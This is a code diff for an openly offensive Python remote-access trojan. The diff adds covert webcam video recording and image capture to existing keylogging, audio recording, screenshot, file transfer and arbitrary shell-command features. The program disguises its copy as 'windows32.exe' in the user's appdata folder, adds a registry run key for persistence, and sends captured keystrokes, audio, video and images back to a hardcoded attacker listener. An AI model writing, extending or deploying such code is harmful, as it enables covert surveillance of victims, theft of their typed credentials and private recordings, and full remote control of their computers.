@@ -10,7 +10,7 @@ from time import *
 import requests as rq
 from mss import mss
 import threading
-import keyLogger, soundRecorder
+import keyLogger, soundRecorder, camRecorder
 
 
 
@@ -53,6 +53,7 @@ def shell():
 	global path, stop_key, stop_rec
 	key_isRunning = False
 	rec_isRunning = False
+	vid_isRunning = False
 	while True:
 		command = Recv()														# received utf-8 encoded message
 		
@@ -60,19 +61,40 @@ def shell():
 		#=========================
 		if (command[:4] == 'help'):
 			help_options = '''\nNote:- All the following commands are Case Sensitive!\n\tAlso please do not confuse them with respective system shell commands!\n
+
 \t(1) help\t\t\t:\tShow this Help menu
+
 \t(2) start <PROGRAM_NAME>\t:\tStart a specified program
+
 \t(3) exit/ quit\t\t\t:\tExit the reverse shell handler
+
 \t(4) get <PATH_TO_FILE>\t\t:\tFetch a file from the target system\n\t\t\t\t\t\tto the current directory of the attacker
+
 \t(5) put <PATH_TO_FILE>\t\t:\tInject a file into the current directory\n\t\t\t\t\t\tof the target system
+
 \t(6) download <URL>\t\t:\tDownload a file from the internet\n\t\t\t\t\t\tinto the target system from the specified URL
+
 \t(7) ss\t\t\t\t:\tCapture a screenshot of the current screen\n\t\t\t\t\t\tof the target system
+
 \t(8) start keylogger\t\t:\tStart recording keystrokes in the target system
+
 \t(9) stop keylogger\t\t:\tStop recording keystrokes\n\t\t\t\t\t\tNote: Keylogger can't be restarted once stopped!
+
 \t(10) dump keys\t\t\t:\tDownload the log file of the recorded keystrokes\n\t\t\t\t\t\tin the current directory of the attacker\n\t\t\t\t\t\tNote:- Only use after stopping Keylogger!
-\t(11) start recording\t\t\t:\tRecord audio input from the default \n\t\t\t\t\t\t audio source of the target.
-\t(12) stop recording\t\t\t:\tStop recording audio
-\t(13) record\t\t\t:\tDownload the file of the recorded audio\n\t\t\t\t\t\tin the current directory of the attacker\n\t\t\t\t\t\tNote:- Only use after stopping Recorder!\n'''
+
+\t(11) start recording\t\t:\tRecord audio input from the default \n\t\t\t\t\t\t audio source of the target.
+
+\t(12) stop recording\t\t:\tStop recording audio
+
+\t(13) record\t\t\t:\tDownload the file of the recorded audio\n\t\t\t\t\t\tin the current directory of the attacker\n\t\t\t\t\t\tNote:- Only use after stopping Recorder!
+
+\t(14) start video\t\t\t:\tStart recording video using the primary camera\n\t\t\t\t\t\tof the target system
+
+\t(15) stop video\t\t\t:\tStop recording the video
+
+\t(16) dump video\t\t\t:\tDownload the recorded video file in attacker's\n\t\t\t\t\t\tcurrent directory\n\t\t\t\t\t\tNote:- Only use after stopping video!
+
+\t(17) capture image\t\t:\tCapture an image from the primary camera\n\t\t\t\t\t\tof the target system [delayed by some frames]\n'''
 			Send(help_options)
 		
 		
@@ -158,7 +180,7 @@ def shell():
 			try:
 				keylog = open(keylog_path, "r")
 				Send(keylog.read())
-#				os.remove(keylog_path)
+
 			except Exception as e:
 				Send("[-] No log file found! Was the Keylogger run properly?")
 		
@@ -219,6 +241,59 @@ def shell():
 				Send("[!] Stopped recording audio on the target system!")
 			except Exception as e:
 				Send(str(e))
+
+		
+		
+		elif (command == "start video"):		
+			if vid_isRunning:
+				Send("[!] Video Recorder is already running!")
+				continue
+			# stop_rec is the event needed to terminate the thread 
+			stop_vid = threading.Event()
+			# the target function takes in the event as an argument
+			vid_thread = threading.Thread(target=camRecorder.captureVideo, args=(stop_vid,))
+			try:
+				vid_thread.start()
+				vid_isRunning = True
+				Send("[!] Video recording started on the target system.")
+			except Exception as e:
+				Send(str(e))
+				
+		
+		
+		elif (command == "dump video"):
+			try:
+				with open(vid_path, "rb") as recvideo:
+					Send(base64.b64encode(recvideo.read()))
+				os.remove(vid_path)
+			except Exception as e:
+				Send("[-] No record file found! Was the Recorder run properly?")
+		
+		
+		
+		elif (command == "stop video"):
+			
+			if not vid_isRunning:
+				Send("[!] Recorder not running!")
+				continue
+			# the event is set here, indicating the thread to stop (handled in the target program)
+			stop_vid.set()
+			try:
+				vid_thread.join()	# the threaded program stops here
+				vid_isRunning = False
+				Send("[!] Stopped recording video on the target system!")
+			except Exception as e:
+				Send(str(e))
+				
+		
+		elif (command == "capture image"):
+			try:
+				camRecorder.imgCapture()
+				with open(img_path, "rb") as img:
+					Send(base64.b64encode(img.read()))
+				os.remove(img_path)
+			except:
+				Send("[-] Falied to capture image!")
 		
 
 
@@ -243,12 +318,9 @@ def shell():
 				os.remove("monitor-1.png")	
 			except Exception as e:
 				print(e)
-				Send("[!] Failed to take Screenshot!")
+				Send("[-] Failed to take Screenshot!")
 		
 		
-		elif command[:7] == 'sendall':
-			sp.Popen(command[8:], shell=True)		
-				
 		
 		else:
 			proc = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE)	
@@ -269,6 +341,8 @@ try:
 	loc = os.environ["appdata"] + "\\windows32.exe"
 	keylog_path = os.environ["appdata"] + "\\Processes.log"
 	rec_path = os.environ["appdata"] + "\\Record.wav"
+	vid_path = os.environ["appdata"] + "\\Vid.mp4"
+	img_path = os.environ["appdata"] + "\\Image.png"
 	if not os.path.exists(loc):													# if the file doesn't exist = program has not run before	;	check fails if file has already been copied once and is running from there
 		shutil.copyfile(sys.executable, loc)									# copy the file as an executable to the specified location
 # adds registry key to run the program at every reboot of the system
@@ -283,7 +357,10 @@ try:
 			num_res = num_1 + num_2
 except Exception as e:
 	print(e)
-#	path = os.environ["HOME"] + "/Processes.log"
+	path = os.environ["HOME"] + "/Processes.log"
+	rec_path = os.environ["HOME"] + "/Record.wav"
+	vid_path = os.environ["HOME"] + "/Vid.mp4"	
+	img_path = os.environ["HOME"] + "/Image.png"
 
 # details of the listening machine (connect to)
 connect_ip = "192.168.0.103"
